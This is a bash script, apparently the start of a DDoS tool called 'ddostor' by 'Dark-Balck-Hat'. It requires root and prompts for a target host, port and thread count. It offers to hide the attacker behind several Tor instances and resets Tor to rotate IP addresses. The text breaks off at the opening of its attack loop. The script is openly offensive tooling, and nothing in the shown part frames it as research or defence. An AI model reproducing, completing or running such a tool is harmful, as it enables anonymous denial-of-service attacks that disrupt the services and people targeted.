#!/bin/bash
# ddostor: DDoS v1.0
# Coded by Dark-Balck-Hat
# Github: https://github.com/Dark-Balck-Hat/DDOS.git


trap 'printf "\n";stop;exit 1' 2

checkroot() {
if [[ "$(id -u)" -ne 0 ]]; then
   printf "\e[1;77m Please, run this program as root!\n \e[0m"
   exit 1
fi
}

changeip() {


killall -HUP tor

}

banner() {

printf "\e[1;93m  ____  ____       ____  \e[0m \e[1;77m\e[0m\n"
printf "\e[1;93m |  _ \|  _ \  ___/ ___| \e[0m\e[1;77m\e[0m\n"
printf "\e[1;93m | | | | | | |/ _ \___ \ \e[0m\e[1;77m\e[0m\n"
printf "\e[1;93m | |_| | |_| | (_) |__) |\e[0m\e[1;77m\e[0m\n"
printf "\e[1;93m |____/|____/ \___/____/ \e[0m\e[1;77m\e[0m\n"
printf "                                          \n"
printf "\e[1;92m  .::.\e[0m\e[1;77m DDoS Tool by Dark-Balck-Hat  \e[0m\e[1;92m.::.\e[0m\n\n"
}
config() {
default_portt="80"
default_threads="600"
default_tor="y"
read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Target: \e[0m' target
read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Port \e[0m\e[1;77m(Default 80): \e[0m' portt
portt="${portt:-${default_portt}}"
read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Threads: \e[0m\e[1;77m(Default 600): \e[0m' threads
threads="${threads:-${default_threads}}"
inst="${inst:-${default_inst}}"
read -e -p $'\e[1;92m[\e[0m\e[1;77m?\e[0m\e[1;92m] Anonymized via Tor? \e[0m\e[1;77m[Y/n]: \e[0m' tor
printf "\e[0m"
tor="${tor:-${default_tor}}"
if [[ $tor == "y" || $tor == "Y" ]]; then
readinst
printf "\e[1;93m[*] Press Ctrl + C to stop attack \e[0m \n"
attacktor
else
attack
fi
}
readinst() {
default_inst="3"
read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Tor instances \e[0m\e[1;77m(default: 3): \e[0m' inst
inst="${inst:-${default_inst}}"
multitor
}
attacktor() {
#let i=1
while true; do
